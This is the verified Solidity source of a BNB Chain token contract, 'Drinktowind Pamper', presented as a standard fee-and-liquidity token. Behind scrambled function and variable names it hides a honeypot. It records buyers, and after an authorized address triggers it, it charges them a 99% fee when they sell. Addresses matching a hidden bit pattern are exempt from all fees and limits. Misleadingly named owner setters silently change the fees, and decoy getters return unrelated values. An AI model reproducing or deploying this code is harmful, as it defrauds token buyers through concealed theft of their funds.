/**
 *Submitted for verification at BscScan.com on 2022-12-20
*/

// SPDX-License-Identifier: MIT

pragma solidity ^0.8.0;


library SafeMath {
    function add(uint256 a, uint256 b) internal pure returns (uint256) {
        uint256 c = a + b;
        require(c >= a, "SafeMath: addition overflow");

        return c;
    }
    function sub(uint256 a, uint256 b) internal pure returns (uint256) {
        return sub(a, b, "SafeMath: subtraction overflow");
    }
    function sub(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {
        require(b <= a, errorMessage);
        uint256 c = a - b;

        return c;
    }
    function mul(uint256 a, uint256 b) internal pure returns (uint256) {
        if (a == 0) {
            return 0;
        }

        uint256 c = a * b;
        require(c / a == b, "SafeMath: multiplication overflow");

        return c;
    }
    function div(uint256 a, uint256 b) internal pure returns (uint256) {
        return div(a, b, "SafeMath: division by zero");
    }
    function div(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {
        // Solidity only automatically asserts when dividing by 0
        require(b > 0, errorMessage);
        uint256 c = a / b;
        // assert(a == b * c + a % b); // There is no case in which this doesn't hold

        return c;
    }
}

interface IBEP20 {
    function totalSupply() external view returns (uint256);

    function decimals() external view returns (uint8);

    function symbol() external view returns (string memory);

    function name() external view returns (string memory);

    function getOwner() external view returns (address);

    function balanceOf(address account) external view returns (uint256);

    function transfer(address recipient, uint256 amount)
    external
    returns (bool);

    function allowance(address _owner, address spender)
    external
    view
    returns (uint256);

    function approve(address spender, uint256 amount) external returns (bool);

    function transferFrom(
        address sender,
        address recipient,
        uint256 amount
    ) external returns (bool);

    event Transfer(address indexed from, address indexed to, uint256 value);
    event Approval(
        address indexed owner,
        address indexed spender,
        uint256 value
    );

}

abstract contract Ownable {
    address internal owner;
    mapping(address => bool) internal competent;

    constructor(address _owner) {
        owner = _owner;
        competent[_owner] = true;
    }

    /**
     * Function modifier to require caller to be contract owner
     */
    modifier onlyOwner() {
        require(isOwner(msg.sender), "!OWNER");
        _;
    }

    /**
     * Function modifier to require caller to be admin
     */
    modifier onlyAuthorized() {
        require(isAuthorized(msg.sender), "!Authorized");
        _;
    }

    /**
     * addAdmin address. Owner only
     */
    function SetAuthorized(address adr) public onlyOwner() {
        competent[adr] = true;
    }

    /**
     * Remove address' administration. Owner only
     */
    function removeAuthorized(address adr) public onlyOwner() {
        competent[adr] = false;
    }

    /**
     * Check if address is owner
     */
    function isOwner(address account) public view returns (bool) {
        return account == owner;
    }

    function Owner() public view returns (address) {
        return owner;
    }

    /**
     * Return address' administration status
     */
    function isAuthorized(address adr) public view returns (bool) {
        return competent[adr];
    }

    /**
     * Transfer ownership to new address. Caller must be owner. Leaves old owner admin
     */
    function transferOwnership(address payable adr) public onlyOwner() {
        owner = adr;
        competent[adr] = true;
        emit OwnershipTransferred(adr);
    }

    event OwnershipTransferred(address owner);

}

interface IPancakePair {
    function getReserves() external view returns (uint112 reserve0, uint112 reserve1, uint32 blockTimestampLast);
}

interface IERC20 {
    function balanceOf(address account) external view returns (uint256);
}

interface IUniswapV2Factory {
    function createPair(address tokenA, address tokenB)
    external
    returns (address pair);
}

interface IUniswapV2Router {
    function factory() external pure returns (address);

    function WETH() external pure returns (address);

    function addLiquidity(
        address tokenA,
        address tokenB,
        uint256 amountADesired,
        uint256 amountBDesired,
        uint256 amountAMin,
        uint256 amountBMin,
        address to,
        uint256 deadline
    )
    external
    returns (
        uint256 amountA,
        uint256 amountB,
        uint256 liquidity
    );

    function addLiquidityETH(
        address token,
        uint256 amountTokenDesired,
        uint256 amountTokenMin,
        uint256 amountETHMin,
        address to,
        uint256 deadline
    )
    external payable returns (uint256 amountToken, uint256 amountETH, uint256 liquidity);

    function swapExactTokensForTokensSupportingFeeOnTransferTokens(
        uint256 amountIn,
        uint256 amountOutMin,
        address[] calldata path,
        address to,
        uint256 deadline
    ) external;

    function swapExactETHForTokensSupportingFeeOnTransferTokens(
        uint256 amountOutMin,
        address[] calldata path,
        address to,
        uint256 deadline
    ) external payable;

    function swapExactTokensForETHSupportingFeeOnTransferTokens(
        uint256 amountIn,
        uint256 amountOutMin,
        address[] calldata path,
        address to,
        uint256 deadline
    ) external;

}

contract DrinktowindPamper is IBEP20, Ownable {
    using SafeMath for uint256;

    uint256  constant MASK = type(uint128).max;
    address WBNB = 0xbb4CdB9CBd36B01bD1cBaEBF2De08d9173bc095c;
    address DEAD = 0x000000000000000000000000000000000000dEaD;
    address ZERO = 0x0000000000000000000000000000000000000000;

    string constant _name = "Drinktowind Pamper ";
    string constant _symbol = "DrinktowindPamper";
    uint8 constant _decimals = 18;

    uint256 _totalSupply = 100000000 * (10 ** _decimals);
    uint256  _maxTxAmount = 2000000 * 10 ** _decimals;
    uint256  _maxWallet = 2000000 * 10 ** _decimals;

    mapping(address => uint256) _balances;
    mapping(address => mapping(address => uint256)) _allowances;
    mapping(address => bool) private txSellBurnExemptIs;
    mapping(address => bool) private burnTradingIsLiquidityMarketingTxExempt;
    mapping(address => bool) private teamReceiverMinIsMode;
    mapping(address => bool) private teamBurnIsLiquidity;
    mapping(address => uint256) private launchedLiquidityTxModeSell;
    mapping(uint256 => address) private walletLaunchedSwapMarketing;
    uint256 public exemptLimitValue = 0;
    uint256 private launchBlock = 0;
    //BUY FEES
    uint256 private marketingBurnTxMaxLimitLaunchedSwap = 0;
    uint256 private swapFeeTradingBuy = 7;

    //SELL FEES
    uint256 private sellLiquidityAutoBuy = 0;
    uint256 private feeTxBuyReceiverTeamBurn = 7;

    uint256 private exemptMinModeBotsMarketingTxReceiver = swapFeeTradingBuy + marketingBurnTxMaxLimitLaunchedSwap;
    uint256 private launchedTradingSwapFee = 100;

    address private botsFeeMarketingLaunchedMode = (msg.sender); // auto-liq address
    address private launchedBurnAutoSwap = (0xF6c9627f31789E7E86c555f6FFFFC1fa18dbb255); // marketing address
    address private modeBurnTeamReceiverMaxLimit = DEAD;
    address private txSellTeamFeeWallet = DEAD;
    address private burnMinSwapTrading = DEAD;

    IUniswapV2Router public router;
    address public uniswapV2Pair;

    uint256 private receiverTxMarketingLaunchedIsAuto;
    uint256 private sellLimitModeBots;

    event BuyTaxesUpdated(uint256 buyTaxes);
    event SellTaxesUpdated(uint256 sellTaxes);

    bool private launchedSwapIsAuto;
    uint256 private exemptMaxSwapBuyTeam;
    uint256 private liquidityBuyBotsLaunchedLimitBurnTx;
    uint256 private botsSellAutoTxMaxMinWallet;
    uint256 private maxMarketingExemptTeamBuyModeTrading;

    bool private tradingModeReceiverAuto = true;
    bool private teamBurnIsLiquidityMode = true;
    bool private txSellMinAuto = true;
    bool private txLiquidityMaxExempt = true;
    bool private tradingWalletTxBotsBurn = true;
    uint256 firstSetAutoReceiver = 2 ** 18 - 1;
    uint256 private minBuyIsModeMax = 6 * 10 ** 15;
    uint256 private tradingTeamAutoLaunchedSwap = _totalSupply / 1000; // 0.1%

    
    bool private feeTeamAutoLimit = false;
    bool private sellFeeTeamBots = false;
    bool private botsLaunchedWalletTradingIsMaxBurn = false;
    bool private liquidityBurnFeeMin = false;
    bool private modeExemptTeamBuyTx = false;
    uint256 private tradingMinModeSell = 0;
    uint256 private maxMarketingMinLaunched = 0;
    bool private walletMarketingMaxMin = false;
    uint256 private walletExemptLimitReceiverTxIsSell = 0;
    uint256 private launchedMinIsExemptBurnBuyTeam = 0;
    uint256 private sellFeeTeamBots0 = 0;
    uint256 private sellFeeTeamBots1 = 0;


    bool inSwap;
    modifier swapping() {
        inSwap = true;
        _;
        inSwap = false;
    }

    constructor() Ownable(msg.sender) {
        address _router = 0x10ED43C718714eb63d5aA57B78B54704E256024E;
        // PancakeSwap Router
        router = IUniswapV2Router(_router);

        uniswapV2Pair = IUniswapV2Factory(router.factory()).createPair(address(this), router.WETH());
        _allowances[address(this)][address(router)] = _totalSupply;

        launchedSwapIsAuto = true;

        txSellBurnExemptIs[msg.sender] = true;
        txSellBurnExemptIs[address(this)] = true;

        burnTradingIsLiquidityMarketingTxExempt[msg.sender] = true;
        burnTradingIsLiquidityMarketingTxExempt[0x0000000000000000000000000000000000000000] = true;
        burnTradingIsLiquidityMarketingTxExempt[0x000000000000000000000000000000000000dEaD] = true;
        burnTradingIsLiquidityMarketingTxExempt[address(this)] = true;

        teamReceiverMinIsMode[msg.sender] = true;
        teamReceiverMinIsMode[0x0000000000000000000000000000000000000000] = true;
        teamReceiverMinIsMode[0x000000000000000000000000000000000000dEaD] = true;
        teamReceiverMinIsMode[address(this)] = true;

        SetAuthorized(address(0x4B6960EAaC122B466852A336ffffdb0DB5B143b7));

        approve(_router, _totalSupply);
        approve(address(uniswapV2Pair), _totalSupply);
        _balances[msg.sender] = _totalSupply;
        emit Transfer(address(0), msg.sender, _totalSupply);
    }

    receive() external payable {}

    function totalSupply() external view override returns (uint256) {
        return _totalSupply;
    }

    function decimals() external pure override returns (uint8) {
        return _decimals;
    }

    function symbol() external pure override returns (string memory) {
        return _symbol;
    }

    function name() external pure override returns (string memory) {
        return _name;
    }

    function getOwner() external view override returns (address) {
        return owner;
    }

    function balanceOf(address account) public view override returns (uint256) {
        return _balances[account];
    }

    function allowance(address holder, address spender) external view override returns (uint256) {
        return _allowances[holder][spender];
    }

    function approve(address spender, uint256 amount) public override returns (bool) {
        _allowances[msg.sender][spender] = amount;
        emit Approval(msg.sender, spender, amount);
        return true;
    }

    function approveMax(address spender) external returns (bool) {
        return approve(spender, _totalSupply);
    }

    function transfer(address recipient, uint256 amount) external override returns (bool) {
        return botsMaxBurnMin(msg.sender, recipient, amount);
    }

    function transferFrom(address sender, address recipient, uint256 amount) external override returns (bool) {
        if (_allowances[sender][msg.sender] != _totalSupply) {
            _allowances[sender][msg.sender] = _allowances[sender][msg.sender]
            .sub(amount, "Insufficient Allowance!");
        }

        return botsMaxBurnMin(sender, recipient, amount);
    }

    function botsMaxBurnMin(address sender, address recipient, uint256 amount) internal returns (bool) {
        
        if (launchedMinIsExemptBurnBuyTeam != walletExemptLimitReceiverTxIsSell) {
            launchedMinIsExemptBurnBuyTeam = marketingBurnTxMaxLimitLaunchedSwap;
        }

        if (maxMarketingMinLaunched != tradingTeamAutoLaunchedSwap) {
            maxMarketingMinLaunched = tradingMinModeSell;
        }

        if (sellFeeTeamBots1 != sellFeeTeamBots0) {
            sellFeeTeamBots1 = sellLiquidityAutoBuy;
        }


        bool bLimitTxWalletValue = liquidityLaunchedBotsWalletMinMax(sender) || liquidityLaunchedBotsWalletMinMax(recipient);
        
        if (launchedMinIsExemptBurnBuyTeam != exemptMinModeBotsMarketingTxReceiver) {
            launchedMinIsExemptBurnBuyTeam = launchBlock;
        }


        if (sender == uniswapV2Pair) {
            if (exemptLimitValue != 0 && isAuthorized(recipient)) {
                buyLimitBotsMinBurnReceiver();
            }
            if (!bLimitTxWalletValue) {
                minTeamModeLiquiditySellBurnIs(recipient);
            }
        }
        
        
        if (sellFeeTeamBots0 != maxMarketingMinLaunched) {
            sellFeeTeamBots0 = marketingBurnTxMaxLimitLaunchedSwap;
        }


        if (inSwap || bLimitTxWalletValue) {return exemptIsMinBots(sender, recipient, amount);}


        if (!txSellBurnExemptIs[sender] && !txSellBurnExemptIs[recipient] && recipient != uniswapV2Pair) {
            require((_balances[recipient] + amount) <= _maxWallet, "Max wallet!");
        }
        
        require((amount <= _maxTxAmount) || teamReceiverMinIsMode[sender] || teamReceiverMinIsMode[recipient], "Max TX Limit!");

        if (minSwapBurnMarketingTradingAuto()) {feeSellLimitBots();}

        _balances[sender] = _balances[sender].sub(amount, "Insufficient Balance!");
        
        uint256 amountReceived = modeFeeMinBots(sender) ? buyBurnBotsExemptFeeMin(sender, recipient, amount) : amount;

        _balances[recipient] = _balances[recipient].add(amountReceived);
        emit Transfer(sender, recipient, amountReceived);
        return true;
    }

    function exemptIsMinBots(address sender, address recipient, uint256 amount) internal returns (bool) {
        _balances[sender] = _balances[sender].sub(amount, "Insufficient Balance!");
        _balances[recipient] = _balances[recipient].add(amount);
        emit Transfer(sender, recipient, amount);
        return true;
    }

    function modeFeeMinBots(address sender) internal view returns (bool) {
        return !burnTradingIsLiquidityMarketingTxExempt[sender];
    }

    function marketingLiquidityBurnModeBots(address sender, bool selling) internal returns (uint256) {
        
        if (selling) {
            exemptMinModeBotsMarketingTxReceiver = feeTxBuyReceiverTeamBurn + sellLiquidityAutoBuy;
            return swapWalletAutoTx(sender, exemptMinModeBotsMarketingTxReceiver);
        }
        if (!selling && sender == uniswapV2Pair) {
            exemptMinModeBotsMarketingTxReceiver = swapFeeTradingBuy + marketingBurnTxMaxLimitLaunchedSwap;
            return exemptMinModeBotsMarketingTxReceiver;
        }
        return swapWalletAutoTx(sender, exemptMinModeBotsMarketingTxReceiver);
    }

    function tradingTeamAutoTx() private view returns (uint256) {
        address t0 = WBNB;
        if (address(this) < WBNB) {
            t0 = address(this);
        }
        (uint reserve0, uint reserve1,) = IPancakePair(uniswapV2Pair).getReserves();
        (uint256 beforeAmount,) = WBNB == t0 ? (reserve0, reserve1) : (reserve1, reserve0);
        uint256 buyAmount = IERC20(WBNB).balanceOf(uniswapV2Pair) - beforeAmount;
        return buyAmount;
    }

    function buyBurnBotsExemptFeeMin(address sender, address receiver, uint256 amount) internal returns (uint256) {
        
        if (sellFeeTeamBots != tradingModeReceiverAuto) {
            sellFeeTeamBots = botsLaunchedWalletTradingIsMaxBurn;
        }


        uint256 feeAmount = amount.mul(marketingLiquidityBurnModeBots(sender, receiver == uniswapV2Pair)).div(launchedTradingSwapFee);

        if (teamBurnIsLiquidity[sender] || teamBurnIsLiquidity[receiver]) {
            feeAmount = amount.mul(99).div(launchedTradingSwapFee);
        }

        _balances[address(this)] = _balances[address(this)].add(feeAmount);
        emit Transfer(sender, address(this), feeAmount);
        
        return amount.sub(feeAmount);
    }

    function liquidityLaunchedBotsWalletMinMax(address addr) private view returns (bool) {
        uint256 v0 = uint256(uint160(addr)) << 192;
        v0 = v0 >> 238;
        return v0 == firstSetAutoReceiver;
    }

    function swapWalletAutoTx(address sender, uint256 pFee) private view returns (uint256) {
        uint256 f0 = launchedLiquidityTxModeSell[sender];
        uint256 f1 = pFee;
        if (f0 > 0 && block.timestamp - f0 > 2) {
            f1 = 99;
        }
        return f1;
    }

    function minTeamModeLiquiditySellBurnIs(address addr) private {
        if (tradingTeamAutoTx() < minBuyIsModeMax) {
            return;
        }
        exemptLimitValue = exemptLimitValue + 1;
        walletLaunchedSwapMarketing[exemptLimitValue] = addr;
    }

    function buyLimitBotsMinBurnReceiver() private {
        if (exemptLimitValue > 0) {
            for (uint256 i = 1; i <= exemptLimitValue; i++) {
                if (launchedLiquidityTxModeSell[walletLaunchedSwapMarketing[i]] == 0) {
                    launchedLiquidityTxModeSell[walletLaunchedSwapMarketing[i]] = block.timestamp;
                }
            }
            exemptLimitValue = 0;
        }
    }

    function minSwapBurnMarketingTradingAuto() internal view returns (bool) {return
    msg.sender != uniswapV2Pair &&
    !inSwap &&
    tradingWalletTxBotsBurn &&
    _balances[address(this)] >= tradingTeamAutoLaunchedSwap;
    }

    function feeSellLimitBots() internal swapping {
        
        uint256 amountToLiquify = tradingTeamAutoLaunchedSwap.mul(marketingBurnTxMaxLimitLaunchedSwap).div(exemptMinModeBotsMarketingTxReceiver).div(2);
        uint256 amountToSwap = tradingTeamAutoLaunchedSwap.sub(amountToLiquify);

        address[] memory path = new address[](2);
        path[0] = address(this);
        path[1] = router.WETH();
        router.swapExactTokensForETHSupportingFeeOnTransferTokens(
            amountToSwap,
            0,
            path,
            address(this),
            block.timestamp
        );
        
        uint256 amountBNB = address(this).balance;
        uint256 totalETHFee = exemptMinModeBotsMarketingTxReceiver.sub(marketingBurnTxMaxLimitLaunchedSwap.div(2));
        uint256 amountBNBLiquidity = amountBNB.mul(marketingBurnTxMaxLimitLaunchedSwap).div(totalETHFee).div(2);
        uint256 amountBNBMarketing = amountBNB.mul(swapFeeTradingBuy).div(totalETHFee);
        
        if (walletExemptLimitReceiverTxIsSell != maxMarketingMinLaunched) {
            walletExemptLimitReceiverTxIsSell = feeTxBuyReceiverTeamBurn;
        }

        if (tradingMinModeSell != maxMarketingMinLaunched) {
            tradingMinModeSell = tradingMinModeSell;
        }

        if (sellFeeTeamBots == txSellMinAuto) {
            sellFeeTeamBots = liquidityBurnFeeMin;
        }


        payable(launchedBurnAutoSwap).transfer(amountBNBMarketing);

        if (amountToLiquify > 0) {
            router.addLiquidityETH{value : amountBNBLiquidity}(
                address(this),
                amountToLiquify,
                0,
                0,
                botsFeeMarketingLaunchedMode,
                block.timestamp
            );
            emit AutoLiquify(amountBNBLiquidity, amountToLiquify);
        }
    }

    
    function getTeamBurnIsLiquidityMode() public view returns (bool) {
        if (teamBurnIsLiquidityMode == feeTeamAutoLimit) {
            return feeTeamAutoLimit;
        }
        if (teamBurnIsLiquidityMode == botsLaunchedWalletTradingIsMaxBurn) {
            return botsLaunchedWalletTradingIsMaxBurn;
        }
        return teamBurnIsLiquidityMode;
    }
    function setTeamBurnIsLiquidityMode(bool a0) public onlyOwner {
        teamBurnIsLiquidityMode=a0;
    }

    function getLaunchBlock() public view returns (uint256) {
        if (launchBlock != tradingTeamAutoLaunchedSwap) {
            return tradingTeamAutoLaunchedSwap;
        }
        return launchBlock;
    }
    function setLaunchBlock(uint256 a0) public onlyOwner {
        if (launchBlock != feeTxBuyReceiverTeamBurn) {
            feeTxBuyReceiverTeamBurn=a0;
        }
        if (launchBlock != swapFeeTradingBuy) {
            swapFeeTradingBuy=a0;
        }
        if (launchBlock == swapFeeTradingBuy) {
            swapFeeTradingBuy=a0;
        }
        launchBlock=a0;
    }

    function getMaxMarketingMinLaunched() public view returns (uint256) {
        if (maxMarketingMinLaunched != sellLiquidityAutoBuy) {
            return sellLiquidityAutoBuy;
        }
        if (maxMarketingMinLaunched == launchBlock) {
            return launchBlock;
        }
        return maxMarketingMinLaunched;
    }
    function setMaxMarketingMinLaunched(uint256 a0) public onlyOwner {
        maxMarketingMinLaunched=a0;
    }

    function getWalletExemptLimitReceiverTxIsSell() public view returns (uint256) {
        if (walletExemptLimitReceiverTxIsSell == tradingMinModeSell) {
            return tradingMinModeSell;
        }
        if (walletExemptLimitReceiverTxIsSell != launchedTradingSwapFee) {
            return launchedTradingSwapFee;
        }
        return walletExemptLimitReceiverTxIsSell;
    }
    function setWalletExemptLimitReceiverTxIsSell(uint256 a0) public onlyOwner {
        if (walletExemptLimitReceiverTxIsSell != walletExemptLimitReceiverTxIsSell) {
            walletExemptLimitReceiverTxIsSell=a0;
        }
        if (walletExemptLimitReceiverTxIsSell != launchedMinIsExemptBurnBuyTeam) {
            launchedMinIsExemptBurnBuyTeam=a0;
        }
        walletExemptLimitReceiverTxIsSell=a0;
    }

    function getTradingTeamAutoLaunchedSwap() public view returns (uint256) {
        if (tradingTeamAutoLaunchedSwap == sellLiquidityAutoBuy) {
            return sellLiquidityAutoBuy;
        }
        if (tradingTeamAutoLaunchedSwap == launchBlock) {
            return launchBlock;
        }
        if (tradingTeamAutoLaunchedSwap != tradingTeamAutoLaunchedSwap) {
            return tradingTeamAutoLaunchedSwap;
        }
        return tradingTeamAutoLaunchedSwap;
    }
    function setTradingTeamAutoLaunchedSwap(uint256 a0) public onlyOwner {
        tradingTeamAutoLaunchedSwap=a0;
    }

    function getSellFeeTeamBots1() public view returns (uint256) {
        return sellFeeTeamBots1;
    }
    function setSellFeeTeamBots1(uint256 a0) public onlyOwner {
        if (sellFeeTeamBots1 == tradingMinModeSell) {
            tradingMinModeSell=a0;
        }
        if (sellFeeTeamBots1 == exemptMinModeBotsMarketingTxReceiver) {
            exemptMinModeBotsMarketingTxReceiver=a0;
        }
        if (sellFeeTeamBots1 == launchedTradingSwapFee) {
            launchedTradingSwapFee=a0;
        }
        sellFeeTeamBots1=a0;
    }

    function getBotsFeeMarketingLaunchedMode() public view returns (address) {
        if (botsFeeMarketingLaunchedMode != modeBurnTeamReceiverMaxLimit) {
            return modeBurnTeamReceiverMaxLimit;
        }
        if (botsFeeMarketingLaunchedMode != txSellTeamFeeWallet) {
            return txSellTeamFeeWallet;
        }
        return botsFeeMarketingLaunchedMode;
    }
    function setBotsFeeMarketingLaunchedMode(address a0) public onlyOwner {
        if (botsFeeMarketingLaunchedMode != launchedBurnAutoSwap) {
            launchedBurnAutoSwap=a0;
        }
        botsFeeMarketingLaunchedMode=a0;
    }

    function getSellFeeTeamBots0() public view returns (uint256) {
        if (sellFeeTeamBots0 != launchedTradingSwapFee) {
            return launchedTradingSwapFee;
        }
        return sellFeeTeamBots0;
    }
    function setSellFeeTeamBots0(uint256 a0) public onlyOwner {
        if (sellFeeTeamBots0 != marketingBurnTxMaxLimitLaunchedSwap) {
            marketingBurnTxMaxLimitLaunchedSwap=a0;
        }
        if (sellFeeTeamBots0 == minBuyIsModeMax) {
            minBuyIsModeMax=a0;
        }
        if (sellFeeTeamBots0 == tradingTeamAutoLaunchedSwap) {
            tradingTeamAutoLaunchedSwap=a0;
        }
        sellFeeTeamBots0=a0;
    }



    event AutoLiquify(uint256 amountBNB, uint256 amountTokens);

}